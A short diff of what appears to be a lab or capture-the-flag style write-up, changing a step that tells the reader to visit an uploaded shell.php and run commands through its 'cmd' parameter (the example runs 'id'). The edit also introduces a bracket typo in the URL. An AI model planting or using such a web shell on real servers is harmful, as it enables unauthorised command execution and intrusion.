@@ -20,7 +20,9 @@ ssh-keygen
     }
 ?>
 ```
-2. go to link http://<ip>/shell.php and execute command:
+
+2. go to link http://[ip[/shell.php and execute command:
+
 ```
 http://<ip>/shell.php?cmd=id
 ```
